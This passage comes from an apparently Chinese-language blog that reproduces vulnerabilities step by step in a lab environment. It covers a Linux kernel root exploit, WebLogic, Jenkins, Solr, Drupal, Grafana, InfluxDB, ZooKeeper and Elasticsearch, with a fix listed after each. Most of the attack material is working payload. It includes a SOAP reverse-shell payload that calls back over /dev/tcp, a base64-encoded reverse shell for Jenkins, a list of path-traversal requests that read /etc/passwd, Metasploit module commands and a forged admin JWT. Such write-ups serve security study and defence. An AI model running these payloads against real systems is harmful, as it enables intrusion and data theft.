&#123;</span><br><span class="line">		perror(&quot;write failed&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	if ((size_t)nbytes &lt; data_size) &#123;</span><br><span class="line">		fprintf(stderr, &quot;short write\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;It worked!\n&quot;);</span><br><span class="line"></span><br><span class="line">        system(&quot;/bin/sh -c &#x27;(echo aaron; cat) | su - -c \&quot;&quot;</span><br><span class="line">                &quot;echo \\\&quot;Restoring /etc/passwd from /tmp/passwd.bak...\\\&quot;;&quot;</span><br><span class="line">                &quot;cp /tmp/passwd.bak /etc/passwd;&quot;</span><br><span class="line">                &quot;echo \\\&quot;Done! Popping shell...\\\&quot;;&quot;</span><br><span class="line">                &quot;sleep 2;&quot;</span><br><span class="line">                &quot;echo \\\&quot;(run commands now)\\\&quot;;&quot;</span><br><span class="line">                &quot;/bin/sh;&quot; // one shold work</span><br><span class="line">            &quot;\&quot; root&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">        printf(&quot;system() function call seems to have failed :(\n&quot;);</span><br><span class="line">	return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%831.png"></p>
<h3 id="修复方案：-9"><a href="#修复方案：-9" class="headerlink" title="修复方案："></a>修复方案：</h3><p>更新升级 Linux 内核到以下安全版本：<br>Linux 内核 &gt;&#x3D; 5.16.11<br>Linux 内核 &gt;&#x3D; 5.15.25<br>Linux 内核 &gt;&#x3D; 5.10.102</p>
<h2 id="step11-weblogic漏洞反序列化漏洞"><a href="#step11-weblogic漏洞反序列化漏洞" class="headerlink" title="step11:weblogic漏洞反序列化漏洞"></a>step11:weblogic漏洞反序列化漏洞</h2><h3 id="漏洞概述：-10"><a href="#漏洞概述：-10" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>WebLogic WLS组件中存在CVE-2017-10271远程代码执行漏洞，可以构造请求对运行WebLogic<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/tdmq?from=10680">中间件</a>的主机进行攻击，近期发现此漏洞的利用方式为传播挖矿程序。</p>
<h3 id="漏洞影响版本：-10"><a href="#漏洞影响版本：-10" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>10.3.6.0.0</p>
<p>12.1.3.0.0</p>
<p>12.2.1.1.0</p>
<p>12.2.1.2.0</p>
<h3 id="漏洞复现：-10"><a href="#漏洞复现：-10" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>第一种方式：直接利用工具</p>
<p><img src="/2023/08/19/images1/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.png"></p>
<p>第二种：</p>
<p>首先进行端口监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p>反弹shell poc：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.88.111/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>通过Burp发包如下：</p>
<p><img src="/2023/08/19/images1/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.png"></p>
<p>反弹shell成功：</p>
<p><img src="/2023/08/19/images1/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962.png"> </p>
<h3 id="修复方案：-10"><a href="#修复方案：-10" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1.临时方案</p>
<p>删除WebLogicwls-wsat组件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm -fr /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war</span><br><span class="line"></span><br><span class="line">rm –fr /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war</span><br><span class="line"></span><br><span class="line">rm -fr  /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat</span><br></pre></td></tr></table></figure>

<p>重启Weblogic域控制器服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/weblogic/Oracle/user_projects/domains/basicWLSDomain/bin/stopWeblogic.sh       </span><br><span class="line">/home/weblogic/Oracle/user_projects/domains/basicWLSDomain/bin/startManagedWebLogic.sh</span><br></pre></td></tr></table></figure>

<p>2.通过补丁升级</p>
<h2 id="step12-grafana任意文件读取漏洞"><a href="#step12-grafana任意文件读取漏洞" class="headerlink" title="step12:grafana任意文件读取漏洞"></a>step12:grafana任意文件读取漏洞</h2><h3 id="漏洞概述：-11"><a href="#漏洞概述：-11" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。</p>
<p>Grafana 8.x API存在任意文件读取漏洞，未经授权的攻击者可利用该漏洞读取目标服务器任意文件，可导致服务器敏感信息泄漏。</p>
<h3 id="漏洞影响版本：-11"><a href="#漏洞影响版本：-11" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>Grafana 8.3.x &lt; 8.3.1</p>
<p>Grafana 8.2.x &lt; 8.2.7</p>
<p>Grafana 8.1.x &lt; 8.1.8</p>
<p>Grafana 8.0.x &lt; 8.0.7</p>
<h3 id="漏洞复现：-11"><a href="#漏洞复现：-11" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>该漏洞主要是grafana里面得插件出现了问题导致可以任意文件读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">poc：</span><br><span class="line">/public/plugins/alertlist/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/annolist/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/barchart/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/bargauge/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/cloudwatch/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashlist/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/elasticsearch/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gauge/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/geomap/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gettingstarted/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/stackdriver/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graph/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graphite/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/heatmap/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/histogram/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/influxdb/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/jaeger/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/logs/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/loki/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mssql/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mysql/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/news/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/nodeGraph/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/opentsdb/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/piechart/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/pluginlist/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/postgres/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/prometheus/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/stat/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/state-timeline/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/status-history/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table-old/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/tempo/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/testdata/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/text/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/timeseries/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/welcome/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/zipkin/../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/grafana.png"></p>
<h3 id="修复方案：-11"><a href="#修复方案：-11" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1、尽快升级至安全版本。</p>
<p>2、配置访问控制策略，仅对允许白名单地址访问，避免Grafana资产在互联网暴露。</p>
<h2 id="step13-Apache-Solr远程代码执行漏洞复现"><a href="#step13-Apache-Solr远程代码执行漏洞复现" class="headerlink" title="step13:Apache Solr远程代码执行漏洞复现"></a>step13:Apache Solr远程代码执行漏洞复现</h2><h3 id="漏洞概述：-12"><a href="#漏洞概述：-12" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。</p>
<h3 id="漏洞影响版本：-12"><a href="#漏洞影响版本：-12" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>solr 8.1.1</p>
<p>solr 8.2.0</p>
<h3 id="漏洞复现：-12"><a href="#漏洞复现：-12" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>利用kali里得msfconsole的multi&#x2F;misc&#x2F;java_jmx_server模块进行攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/misc/java_jmx_server</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/solr%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C1.png"> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set RHOSTS 192.168.88.111   //靶场的IP</span><br><span class="line">set RPORT 18983            //靶场jmx服务的端口</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/solr%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C2.png"></p>
<p>执行linux基础命令查看权限和ip</p>
<p><img src="/2023/08/19/images1/solr%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C3.png"> </p>
<h3 id="修复方案：-12"><a href="#修复方案：-12" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1、配置文件solr.in.sh的配置选项<strong>ENABLE_REMOTE_JMX_OPTS</strong>值改为”false”，然后重启</p>
<p>2、升级Solr版本</p>
<h2 id="step14-drupl-命令执行漏洞（CVE-2014-3704）"><a href="#step14-drupl-命令执行漏洞（CVE-2014-3704）" class="headerlink" title="step14:drupl 命令执行漏洞（CVE-2014-3704）"></a>step14:drupl 命令执行漏洞（CVE-2014-3704）</h2><h3 id="漏洞概述：-13"><a href="#漏洞概述：-13" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，执行任意代码。</p>
<h3 id="漏洞影响版本：-13"><a href="#漏洞影响版本：-13" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>drupl 7.0~7.31</p>
<h3 id="漏洞复现：-13"><a href="#漏洞复现：-13" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>msf工具利用</p>
<p>搜索drupal漏洞利用模块:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal </span><br></pre></td></tr></table></figure>

<p>使用CVE-2014-3704对应的攻击模块:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/drupal_drupageddon</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/drupal1.png"></p>
<p>设置Drupal网站路径:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set targeturi /drupal-7.31/  </span><br></pre></td></tr></table></figure>

<p>配置攻击的ip和端口:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 192.168.88.111</span><br><span class="line">set rport 80</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/drupal2.png"> </p>
<p>发动攻击, 拿到shell:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/drupal3.png"></p>
<h3 id="修复方案：-13"><a href="#修复方案：-13" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1.使用的是Drupal 7，更新至Drupal 7.74；</p>
<p>2.使用的是Drupal 8.8或更早版本，更新到Drupal 8.8.11；</p>
<p>3.使用的是Drupal 8.9，更新至Drupal 8.9.9；</p>
<p>4.使用的是Drupal 9.0，更新至Drupal 9.0.8；</p>
<p>5.审核所有以前上传的文件，以检查是否有恶意扩展名。可专门查找包含多个扩展名的文件，例如filename.php.txt或filename.html.gif，扩展名中不带下划线(_)。需要特别注意以下文件扩展名phar、php、pl、py、cgi、asp、js、html、htm、phtml等，即使后面有一个或多个其他扩展名，也应将其视为危险文件。</p>
<h2 id="step15-jenkins命令执行"><a href="#step15-jenkins命令执行" class="headerlink" title="step15:jenkins命令执行"></a>step15:jenkins命令执行</h2><h3 id="漏洞概述：-14"><a href="#漏洞概述：-14" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。通过这个漏洞，可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。</p>
<h3 id="漏洞影响版本：-14"><a href="#漏洞影响版本：-14" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>Jenkins 2.153及更早版本，LTS 2.138.3及更早版本</p>
<h3 id="漏洞复现：-14"><a href="#漏洞复现：-14" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py http://192.168.88.111:8080/ &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljg4LjExMS80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/jenkins%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/jenkins%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2.png"></p>
<h3 id="修复方案：-14"><a href="#修复方案：-14" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1.升级到最新版本或打上相关补丁</p>
<p>2.尽量不要开放到公网上</p>
<p>3.限制IP访问</p>
<h2 id="step16-Apache-Druid-任意文件读取"><a href="#step16-Apache-Druid-任意文件读取" class="headerlink" title="step16:Apache Druid 任意文件读取"></a>step16:Apache Druid 任意文件读取</h2><h3 id="漏洞概述：-15"><a href="#漏洞概述：-15" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>由于用户指定 HTTP InputSource 没有做出限制，可以通过将文件 URL 传递给 HTTP InputSource 来绕过应用程序级别的限制。由于 Apache Druid 默认情况下是缺乏授权认证，攻击者可利用该漏洞在未授权情况下，构造恶意请求执行文件读取，最终造成服务器敏感性信息泄露。</p>
<h3 id="漏洞影响版本：-15"><a href="#漏洞影响版本：-15" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Druid Version &lt;0.22</span><br></pre></td></tr></table></figure>

<h3 id="漏洞复现：-15"><a href="#漏洞复现：-15" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>主页–&gt;Load data –&gt;HTTP(s)–&gt;Connect Data–&gt;URIs处(写入file:&#x2F;&#x2F;协议进行读取)-&gt; Apply -&gt; 显示文件内容</p>
<p><img src="/2023/08/19/images1/druid1.png"></p>
<p><img src="/2023/08/19/images1/druid2.png"></p>
<p><img src="/2023/08/19/images1/druid3.png"></p>
<h3 id="修复方案：-15"><a href="#修复方案：-15" class="headerlink" title="修复方案："></a>修复方案：</h3><p>对Apache Druid做鉴权处理 </p>
<p>升级到最新版本 </p>
<h2 id="step17：influxDB认证绕过漏洞"><a href="#step17：influxDB认证绕过漏洞" class="headerlink" title="step17：influxDB认证绕过漏洞"></a>step17：influxDB认证绕过漏洞</h2><h3 id="漏洞概述：-16"><a href="#漏洞概述：-16" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p> InfluxDB是一个使用Go语言编写的开源<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%88%86%E5%B8%83%E5%BC%8F&spm=1001.2101.3001.7020">分布式</a>，支持高并发的时序数据库，其使用JWT作为鉴权方式。在用户开启了认证，但未设置参数shared-secret的情况下，JWT的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在InfluxDB中执行SQL语句。</p>
<h3 id="漏洞影响版本：-16"><a href="#漏洞影响版本：-16" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Influxdb &lt; 1.7.6</span><br></pre></td></tr></table></figure>

<h3 id="漏洞复现：-16"><a href="#漏洞复现：-16" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>利用路线：</p>
<p>Influxdb http query接口—&gt; 生成jwt凭证绕过认证 —&gt;任意sql语句执行</p>
<p>访问<a target="_blank" rel="noopener" href="http://your-ip:8086/debug/vars%E5%8D%B3%E5%8F%AF%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%BA%9B%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E3%80%82">http://your-ip:8086/debug/vars即可查看一些服务信息。</a></p>
<p><img src="/2023/08/19/images1/influxdb%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E1.png"></p>
<p>执行SQL语句则会出现401错误，提示没有用户认证。</p>
<p><img src="/2023/08/19/images1/influxdb%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E2.png"></p>
<p>InfluxDB具有Web管理界面，其存在一个默认的admin用户名，利用该用户名生成JSON Web Token后即可绕过认证，获得完整的用户权限，可以任意执行增删改等数据库操作。</p>
<p>地址：<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; “alg”: “HS256”, “typ”: “JWT” &#125; &#123; “username”: “admin”, “exp”: 1716239022 &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/influxdb%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E3.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE2MjM5MDIyfQ.jo8FUdPG0-_DBrXzkWvIja5fNbK-1rgs8pss46nKJuE</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/influxdb%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E4.png"></p>
<h3 id="修复方案：-16"><a href="#修复方案：-16" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1.在配置文件给shared-secret参数添加一个特定值。</p>
<p><img src="/2023/08/19/images1/influxdb%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E5.png"> </p>
<p>2.本漏洞影响InfluxDB 1.7.5 及以下全版本，升级到1.7.5版本以上</p>
<h2 id="step18：zookeeper未授权访问漏洞"><a href="#step18：zookeeper未授权访问漏洞" class="headerlink" title="step18：zookeeper未授权访问漏洞"></a>step18：zookeeper未授权访问漏洞</h2><h3 id="漏洞概述：-17"><a href="#漏洞概述：-17" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p>
<p>ZooKeeper默认开启在<code>2181</code>端口，在未进行任何访问控制情况下，攻击者可通过执行<code>envi</code>命令获得系统大量的敏感信息，包括系统名称、Java环境。</p>
<h3 id="漏洞影响版本：-17"><a href="#漏洞影响版本：-17" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>zookeeper全版本</p>
<h3 id="漏洞复现：-17"><a href="#漏洞复现：-17" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。</p>
<p>1、stat：列出关于性能和连接的客户端的统计信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">stat</span> |nc ip 2181</span><br></pre></td></tr></table></figure>

<p>2、ruok：测试服务器是否运行在非错误状态。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ruok |nc ip 2181</span><br></pre></td></tr></table></figure>

<p>3、reqs：列出未完成的请求。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> reqs |nc ip 2181</span><br></pre></td></tr></table></figure>

<p>4、envi：打印有关服务环境的详细信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> envi |nc iP 2181</span><br></pre></td></tr></table></figure>

<p>5、dump：列出未完成的会话和临时节点。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> dump |nc ip 2181</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/zookeeper%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.png"></p>
<h3 id="修复方案：-17"><a href="#修复方案：-17" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1、修改 ZooKeeper 默认端口，采用其他端口服务。<br>2、添加访问控制，配置服务来源地址限制策略。<br>3、增加 ZooKeeper 的认证配置。</p>
<h2 id="step19-elasticsearch未授权访问漏洞"><a href="#step19-elasticsearch未授权访问漏洞" class="headerlink" title="step19:elasticsearch未授权访问漏洞"></a>step19:elasticsearch未授权访问漏洞</h2><h3 id="漏洞概述：-18"><a href="#漏洞概述：-18" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接口完。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限并能进行任意命令执行，使得业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。</p>
<h3 id="漏洞影响版本：-18"><a href="#漏洞影响版本：-18" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>全版本</p>
<h3 id="漏洞复现：-18"><a href="#漏洞复现：-18" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9200/_cat/indices</span><br><span class="line">http://localhost:9200/_river/_search 查看数据库敏感信息</span><br><span class="line">http://localhost:9200/_nodes 查看节点数据</span><br><span class="line">如有安装head插件：</span><br><span class="line">http://localhost:9200/_plugin/head/ web管理界面</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/el%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E1.png"></p>
